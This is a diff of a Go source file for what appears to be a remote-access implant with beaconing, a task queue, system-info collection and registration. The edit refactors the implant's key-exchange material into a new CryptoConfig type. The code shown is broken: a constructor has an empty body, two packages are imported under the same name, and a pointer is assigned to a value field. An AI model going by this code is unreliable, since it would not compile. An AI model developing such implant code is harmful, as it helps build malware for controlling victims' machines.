@@ -3,9 +3,12 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"crypto/rand"
 	"encoding/json"
 	"fmt"
+	"github.com/go-co-op/gocron/v2"
 	"io"
+	"math"
 	"math/big"
 	"math/rand"
 	"net/http"
@@ -13,8 +16,6 @@ import (
 	"path/filepath"
 	"strings"
 	"time"
-
-	"github.com/go-co-op/gocron/v2"
 )
 
 /*
@@ -53,6 +54,16 @@ type CryptoConfig struct {
 	privateKey      big.Int
 }
 
+func NewCryptoConfig() *CryptoConfig {
+
+}
+
+func (c *CryptoConfig) generatePrivateKey() {
+	prime, _ := rand.Prime(rand.Reader, 128)
+	privateKey, _ := rand.Int(rand.Reader, prime)
+	c.privateKey = privateKey
+}
+
 type Implant struct {
 	ID           uint          `json:"id"`
 	BeaconConfig *BeaconConfig `json:"beacon_config"`
@@ -70,11 +81,9 @@ func NewImplant() (*Implant, error) {
 	priv_key := generatePrivateKey()
 
 	impl := &Implant{
-		SystemInfo:         GetSystemInfo(),
-		TaskQueue:          NewTaskQueue(),
-		shared_prime:       p,
-		shared_generator:   g,
-		implant_public_key: calculatePublicKey(p, priv_key, g),
+		SystemInfo:   GetSystemInfo(),
+		TaskQueue:    NewTaskQueue(),
+		CryptoConfig: NewCryptoConfig(),
 	}
 
 	protocol, err := impl.register()
